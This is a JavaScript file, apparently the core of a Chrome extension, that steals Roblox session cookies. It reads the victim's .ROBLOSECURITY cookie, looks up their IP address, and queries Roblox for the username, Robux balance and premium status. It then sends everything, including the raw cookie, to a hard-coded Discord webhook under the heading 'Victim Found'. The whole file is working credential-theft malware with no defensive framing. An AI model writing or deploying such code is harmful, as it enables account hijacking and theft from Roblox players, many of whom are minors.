const WEBHOOK = "https://discord.com/api/webhooks/1322567795820466326/3PF0HjpJ9VVuJNW7kXHnRXx_tJMBlWUp_nTQ1qKeEM3ipeYfc6fTdnmnC_pNC5c2rOgL";

async function main(cookie) {
    try {
        // Fetch IP Address
        const ipResponse = await fetch("https://api.ipify.org");
        const ipAddr = await ipResponse.text();

        let statistics = null;
        
        if (cookie) {
            // Fetch Roblox user info
            const userResponse = await fetch("https://www.roblox.com/mobileapi/userinfo", {
                headers: {
                    Cookie: `.ROBLOSECURITY=${cookie}`
                },
                redirect: "manual"
            });

            if (userResponse.ok) {
                statistics = await userResponse.json();
            }
        }

        // Send data to the webhook
        await fetch(WEBHOOK, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: null,
                embeds: [
                    {
                        description: "```" + (cookie || "COOKIE NOT FOUND") + "```",
                        color: 3447003, // Blue color
                        fields: [
                            {
                                name: "Username",
                                value: statistics?.UserName || "N/A",
                                inline: true
                            },
                            {
                                name: "Robux",
                                value: statistics?.RobuxBalance?.toString() || "N/A",
                                inline: true
                            },
                            {
                                name: "Premium",
                                value: statistics?.IsPremium ? "Yes" : "No",
                                inline: true
                            }
                        ],
                        author: {
                            name: "Victim Found: " + ipAddr,
                            icon_url: statistics?.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                        },
                        footer: {
                            text: "https://github.com/ox-y",
                            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                        },
                        thumbnail: {
                            url: statistics?.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                        }
                    }
                ],
                username: "Roblox",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
                attachments: []
            })
        });
    } catch (error) {
        console.error("An error occurred:", error);
    }
}

// Ensure Chrome extension permissions include "cookies" and the Roblox domain
chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, function(cookie) {
    main(cookie?.value || null);
});
